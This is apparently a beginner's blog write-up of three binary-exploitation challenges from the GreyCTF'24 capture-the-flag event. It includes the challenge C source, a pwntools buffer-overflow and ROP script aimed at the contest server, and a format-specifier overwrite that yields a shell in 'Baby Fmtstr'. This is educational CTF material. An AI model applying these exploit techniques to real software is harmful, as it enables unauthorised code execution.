---
title: GreyCTF'24 Writeup
description: GreyCTF'24 Writeup
publishDate: 9 May 2024
tags:
- ctf
pinned: false
draft: false
---

I must say, I've been quite a fan of NUS Greyhat events recently. From Hackbash, I joined Grey Cat the Flag 24 fully expecting to get rekt by every question in the annual flagship event, but what harm is there trying? So here are my pwn writeups from the experience of an absolute pwn noob trying to get better. (They say dont put all your eggs in one basket, but clearly, I didn't listen.)

## Introduction

During the duration of the 24h event, I managed to solve two pwn challenges and one more after it has concluded. They touched on various areas of Binary Exploitation, such as ROP, one that I've never touched on before so I would say that this event was a W nevertheless. A lot of the challenges are fundamentally simple and just require careful observation but rather annoying to implement (_ahem, babyfmtstr_). I'll go more into this later as we go along.

## Baby Goods (100pts)

Baby goods was a relatively simple buffer overflow challenge that I'll pass on explaining.

:::note
My previous writeup on Hackbash has talked about exploiting buffer overflow vulns including debugging techniques.  _Read it [here](/posts/hackbash-2024/)._  
:::

## The Motorola (100pts)

The Motorola is the first part to the motorola series and a relatively easy challenge, touching on Return Oriented Programming (ROP). Lets have a look at the challenge given.

```c title="chall.c"
//remove the import lines to save spaces
char* pin;
// this is the better print, because i'm cool like that ;)
void slow_type(char* msg) {
	int i = 0;
	while (1) {
		if (!msg[i])
			return;
		putchar(msg[i]);
		usleep(5000);
		i += 1;
	}
}

void view_message() {
	int fd = open("./flag.txt", O_RDONLY);
	char* flag = calloc(0x50, sizeof(char));
	read(fd , flag, 0x50);
	close(fd);
	slow_type("\n\e[1;93mAfter several intense attempts, you successfully breach the phone's defenses.\nUnlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.\nThe once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.\n\e[0m");
	printf("\n%s\n", flag);
	exit(0);
}

void retrieve_pin(){
	FILE* f = fopen("./pin", "r");
	pin = malloc(0x40);
	memset(pin, 0, 0x40);
	fread(pin, 0x30, 0x1, f);
	fclose(f);
}

void login() {
	char attempt[0x30];
	int count = 5;

	for (int i = 0; i < 5; i++) {
		memset(attempt, 0, 0x30);
		printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
		printf("PIN: ");
		scanf("%s", attempt);
		if (!strcmp(attempt, pin)) {
			view_message();
		}
	}
	slow_type("\n\e[1;33mAfter five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.\e[0m\n\n");
}

void banner() {

	slow_type("\e[1;33mAs you breached the final door to TACYERG's hideout, anticipation surged.\nYet, the room defied expectations – disorder reigned, furniture overturned, documents scattered, and the vault empty.\n'Yet another dead end,' you muttered under your breath.\nAs you sighed and prepared to leave, a glint caught your eye: a cellphone tucked away under unkempt sheets in a corner.\nRecognizing it as potentially the last piece of evidence you have yet to find, you picked it up with a growing sense of anticipation.\n\n\e[0m");

    puts("                         .--.");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("                         |  | ");
	puts("        _.-----------._  |  | ");
	puts("     .-'      __       `-.  | ");
	puts("   .'       .'  `.        `.| ");
	puts("  ;         :    :          ; ");
	puts("  |         `.__.'          | ");
	puts("  |   ___                   | ");
	puts("  |  (_M_) M O T O R A L A  | ");
	puts("  | .---------------------. | ");
	puts("  | |                     | | ");
	puts("  | |      \e[0;91mYOU HAVE\e[0m       | | ");
	puts("  | |  \e[0;91m1 UNREAD MESSAGE.\e[0m  | | ");
	puts("  | |                     | | ");
	puts("  | |   \e[0;91mUNLOCK TO VIEW.\e[0m   | | ");
	puts("  | |                     | | ");
	puts("  | `---------------------' | ");
	puts("  |                         | ");
	puts("  |                __       | ");
	puts("  |  ________  .-~~__~~-.   | ");
	puts("  | |___C___/ /  .'  `.  \\  | ");
	puts("  |  ______  ;   : OK :   ; | ");
	puts("  | |__A___| |  _`.__.'_  | | ");
	puts("  |  _______ ; \\< |  | >/ ; | ");
	puts("  | [_=]						\n");

	slow_type("\e[1;94mLocked behind a PIN, you attempt to find a way to break into the cellphone, despite only having 5 tries.\e[0m\n\n");
}


void init() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	retrieve_pin();
	printf("\e[2J\e[H");
}

int main() {
	init();
	banner();
	login();
}
```

As you can tell, `scanf()` in `login()` is vulnerable to a buffer overflow as it does not define the size of the variable in its parameters. To do this we can use generate a string with cyclic and use gdb to determine buffer the overflow.

But the challenge didn't work on the remote server. I hit a segmentation fault despite knowing I definitely sent in the right address to `view_message()`. _WHY????????_ After such anguish I decided to ask support if it was me or them. Thankfully, it was me.

Based on support's support _(lol)_ I managed to land on a reddit post _(after googling "pwn buffer overflow segmentation fault why")_ that mentioned by passing in a **ret gadget** before the address, I could jump to the the address I wanted.

:::tip
Segmentaiton faults happen when you try to exist a memory that does not exist.
:::

### What is ROP and a ret gadget

I'm not the best person to explain indepth how ROP works after hitting a segmentation fault and why its needed so I shall link the _guide_[^ROP_guide] that helped me understand. In essence, the program hit a seg fault because it did not "end gracefully". By using a ret gadget, we can safely exit the function and then jump to the targeted address right after.

So how do we obtain the ret gadget? Surprisingly simple. **We just have to find one.**

### How to obtain a ret gadget

To obtain a ret gadget, I used ropper to list all ret addresses. 
```
ropper -f ./chall
```

:::figure
![Desktop View](./299ac7233972.png)

List of ret gadgets in chall.c
:::


I picked a random gadget from the list generated and with pwntools I send it in before the address. Finally, we have reached the solution. _*insert happy sigh*_

### The Final Solution

```python title="solution.py"
from pwn import *

p = remote("challs.nusgreyhats.org", 30211)
# p = process("./chall")

ret = p64(0x40101a) #ret gadget

payload = b"A"*72
payload += ret
payload += p64(0x401392)
p.sendlineafter(b"PIN: ", payload)
p.interactive()
```


## Baby Fmtstr

During the 24h I attempted baby-fmtstr for some time thinking that I would know how to identify the vuln based on the name of the challenge _(I touched on it during picoctf'24 which I am still procrastinating on writing till this day)_. **I WAS WRONG.** I found no exploit other than a buffer overflow and gave up after a few hours. 

Turns out, it was a single key thing I missed. Here is the source code with my breakdown commented.

### Looking closer

From the source code you can tell that the file asks for 3 options:  `print_time()` with the buffer overflow exploit, `set_locale()` allowing you to change locale and `goodbye()` can be used to print out the flag. So what exactly did I miss..? 

```c title="fmtstr.c"
//removed import lines to safe space
void setup(){
    setvbuf(stdout, NULL, _IONBF, 0);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

//global variables
char output[0x20];
char command[0x20];
// Choice 3
void goodbye(){
    puts("AdiÃ³s!");
    system(command);
}
// Choice 1
void print_time(){
    time_t now;
    struct tm *time_struct;
    char input[0x20];
    char buf[0x30];

    time(&now);
    time_struct = localtime(&now);

    printf("The time now is %d.\nEnter format specifier: ", now);
    fgets(input, 0x20, stdin); // buffer overflow here
    
    //validates input
    for(int i = 0; i < strlen(input)-1; i++){
        if(i % 2 == 0 && input[i] != '%'){
            puts("Only format specifiers allowed!");
            exit(0); 
        }
    }

    strftime(buf, 0x30, input, time_struct); // writes into variable : buf
    buf[strlen(buf)-1] = '\0';// remove newline at the end
    memcpy(output, buf, strlen(buf)); //puts contents that buf points, to the address of global variable output
    printf("Formatted: %s\n", output);
}
//Choice 2
void set_locale(){
    char input[0x20];
    printf("Enter new locale: ");
    fgets(input, 0x20, stdin);
    char *result = setlocale(LC_TIME, input);
    if(result == NULL){
        puts("Failed to set locale :(");
        puts("Run locale -a for a list of valid locales.");
    }else{
        puts("Locale changed successfully!");
    }
}

int main(){
    int choice = 0;
    setup();
    strcpy(command, "ls");
    while (1){
        puts("Welcome to international time converter!");
        puts("Menu:");
        puts("1. Print time");
        puts("2. Change language");
        puts("3. Exit");
        printf("> ");
        scanf("%d", &choice);
        getchar(); // read each character and returns them
        if(choice == 1){
            print_time();
        }else if(choice == 2){
            set_locale();
        }else{
            goodbye();
        }
        puts("");
    }
}
```

**Yes.** I missed the fact that the global variables of output and command were written above one another. We could use the buffer overflow vuln in `print_time()` to overwrite into `command` that `goodbye()` uses. The simplest way would be to write an `sh` into `command`, but this is so much easier said than done. 

```c title="fmtstr.c"
//validates input
for(int i = 0; i < strlen(input)-1; i++){ //condition ensures that at every odd position = %
    if(i % 2 == 0 && input[i] != '%'){
        puts("Only format specifiers allowed!");
        exit(0); 
    }
}
strftime(buf, 0x30, input, time_struct);
```

As you can see, we are restricted to the outputs of `strftime()` and the condition. Not to fret though! There are two methods of tackling this. The smart way and the brute force way.

### The Smart Way

:::caution
I do not own this solution. It was from the discussion I've read on this challenge and implemented it myself.
:::

This is by far the easiest way to solve this challenge.
1. Overflow the output (with some trial and error)
2. Use an invalid option of `strftime()` such as `%0` while maintaining the % for every odd position
3. Add `%h` add the back to add the first letter
4. Repeat steps 1-3 but remove one byte in step 1 so as not to overwrite `h`
5. Add `%s` add the back to add the final letter
6. Run Choice 3 to get a shell.

```shell
Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> 1
The time now is 1711944005.
Enter format specifier: %A%A%A%A%A%%%%%0%h      
Formatted: MondayMondayMondayMondayMonday%%%h

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> 3
Adiós!
sh: 1: %h: not found

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> 1   
The time now is 1711944006.
Enter format specifier: %A%A%A%A%A%%%0%s      
Formatted: MondayMondayMondayMondayMonday%%sh

Welcome to international time converter!
Menu:
1. Print time
2. Change language
3. Exit
> 3
Adiós!
$ ls
bash.sh     exploit.py  fmtstr    locales.txt         script.py  working.txt
Dockerfile  flag.txt    fmtstr.c  remote_working.txt  test.py
$ 
```
It is this simple ! I literally could not believe this worked. It seems that because `%0` is not a valid option, the function stops running after and leaves `%s` and `%h` intact. Leading to and easy overwrite. Wow. 

### The Brute Force Way

This is a solution that took a lot longer...and spoiler alert...I'm still trying to fix it. 

But theoretically, I wanted to create a script that looped every locale with every option of `strftime()` to be able to find outputs that ended with `s` and `h`. Since when locale changes, `strftime()` changes as well.

#### Where to get all locales man..
As I'm using kali, so it is pretty simple to download all locales.[^locales]
```shell
sudo dpkg-reconfigure locales
```
Afterwards, I can simply pass the output to a .txt file.
```shell
locale -a >> locales.txt
```
#### The Script

```python title="script.py"
from pwn import *
import subprocess
import time

p = process("./fmtstr")

locales_file = 'locales.txt' #local=locales.txt remote = working.txt
working_file = 'working.txt' #local=working.txtremote = remote_working.txt

with open(locales_file, "r") as file:
    output_file = open(working_file, "w")
    for line in file:
        # start script
        locale = line.strip()

        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b'Enter new locale: ', locale)
        if (b'Locale changed successfully!' in p.recvline()):
            # print(locale)
            # All locale options from strftime retrieved from Chatgpt
            options = ["%a", "%A", "%b", "%B", "%c", "%C", "%d", "%D", "%e", "%F", "%g", "%G", "%h", "%I", "%j", "%m", "%M", "%n", "%p", "%r", "%R", "%S", "%t", "%T", "%u", "%U", "%V", "%w", "%x", "%X", "%y", "%Y", "%z", "%Z", "%%"]
            add_locale = False
            # Run every option in strftime for every working locale
            for i in options:
                p.sendlineafter(b'> ', b'1')
                p.sendlineafter(b"Enter format specifier: ", i)
                response = p.recvuntil(b"1.")
                if (response[-6] == 104 or response[-6] == 115):
                    print (locale + ":" + i + " ")
                    print(response[-6])
                    # Write locale to working file only once
                    if (add_locale == False):
                        add_locale = True
                        output_file.write(locale+"\n")
```

#### Issues I faced

The intended solution of this challenge was timelocked to the month and April and December so by automating this script I wanted be able to run the script from my current time (May) and discover other inputs leading me to still be able to solve the solution on the remote server.

##### Timeout on remote server

However some issues were also due to the timeout on the remote server. So, the script would shortlist possible locales first before running the shortlisted ones on the remote server. 

##### Invisible bytes

There then came the biggest issue of my script which were the random invisible bytes. When I used `pwn.recvline()` or `pwn-recvuntil('')` I could not read the last character of every output consistently from the random characters.

Till now, I am still finding a fix. Or maybe the script is obsolete..?


## Final Words

I have procrastinated too long on this writeup, but just in time for the writeup submission (I think). GreyCTF was another fun event held by NUS Greyhats and I enjoyed the 24h challenge thoroughly. The organizing team always seems to do a great job with their events and I always look forward to their next _(maybe its also because I really like cats...by anyways)_.

Usually, when writeups are written by advanced CTF players they tend to skip certain specifics due to their experience. I hope that by creating my own writeups, other beginners would be able to pick up on certain observations and debugging techniques when the solutions are written by a beginner themselves. If you happen to have feedback or would like to share anything with me after reading my blog, feel free to reach out to me.

Ok end of writeup. Toodles~

[^locales]: How to add all locales in Kali: <https://youtu.be/S5EWItTN0WI>
[^ROP_guide]: ROP Explanation: <https://tc.gts3.org/cs6265/tut/tut06-01-rop.html#step-3-your-first-rop>
